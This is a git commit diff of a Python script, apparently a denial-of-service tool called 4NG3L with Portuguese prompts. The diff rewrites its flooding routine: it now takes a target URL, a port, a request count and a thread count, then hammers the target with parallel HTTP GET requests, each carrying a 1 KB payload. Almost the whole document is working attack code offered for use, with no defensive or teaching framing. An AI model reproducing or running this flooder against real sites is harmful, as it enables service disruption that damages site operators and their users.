2f2ddcf126d5638c6e7ca6b3fd9c01a551fdd1f5
Fbosell <164439130+Fbosell@users.noreply.github.com>
2024-06-30 01:33:35 -0300

    4NG3L.py

--- 4NG3L.py
+++ 4NG3L.py
@@ -1,8 +1,5 @@
-import asyncio
-import aiohttp
-import socket
+import requests
 import threading
-import time
 from colorama import init, Fore, Style
 import os
 
@@ -21,67 +18,42 @@ intro = f"""{Fore.RED}
 
 
 print(intro)
-instalar()
 
 
+print("\033[91m") 
 
 
+# Função para enviar solicitações HTTP GET em um loop com payload
+def flood(url, port, num_requests, payload):
+    for _ in range(num_requests):
+        try:
+            response = requests.get(f"{url}:{port}", params={'data': payload})
+            print(f"Solicitação enviada para {url}:{port}, Status: {response.status_code}")
+        except Exception as e:
+            print(f"Erro ao enviar solicitação para {url}:{port}: {e}")
 
-
-
-
-
-async def send_request(url, session):
-    try:
-        await session.get(url)
-    except Exception as e:
-        print(f"Erro ao enviar solicitação: {e}")
-
-async def attack(url, num_requests, num_threads):
-    async with aiohttp.ClientSession() as session:
-        tasks = []
-        for _ in range(num_threads):
-            task = asyncio.ensure_future(send_request(url, session))
-            tasks.append(task)
-
-        await asyncio.gather(*tasks)
-
+# Função principal
 def main():
-    print("Selecione o tipo de ataque:\n")
-    print("1. Ataque HTTP")
-    print("2. Ataque HTTPS\n")
-    choice = int(input("Digite o número da sua escolha: "))
+    url = input("Insira o URL alvo: ")
+    port = input("Insira a porta para se comunicar: ")
+    num_requests = int(input("Insira o número de solicitações a serem enviadas por thread: "))
+    num_threads = int(input("Insira o número de threads: "))
+    
+    # Criar um payload com dados significativos em bytes (exemplo: 1 KB)
+    payload_size = 1024  # 1 KB
+    payload = 'a' * payload_size  # Payload de 1 KB de 'a'
 
-    if choice == 1:
-        url = input("Insira o URL alvo: ")
-        num_requests = int(input("Insira o número de solicitações por thread: "))
-        num_threads = int(input("Insira o número de threads: "))
-        attack(url, num_requests, num_threads)
-    elif choice == 2:
-        url = input("Insira o URL alvo (HTTPS): ")
-        num_requests = int(input("Insira o número de solicitações por thread: "))
-        num_threads = int(input("Insira o número de threads: "))
-        asyncio.run(attack(url, num_requests, num_threads))
-    else:
-        print("Opção inválida")
+    # Criar threads para enviar solicitações em paralelo
+    threads = []
+    for _ in range(num_threads):
+        thread = threading.Thread(target=flood, args=(url, port, num_requests, payload))
+        threads.append(thread)
+        thread.start()
+
+    # Aguardar todas as threads concluírem
+    for thread in threads:
+        thread.join()
 
 if __name__ == "__main__":
     main()
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
 
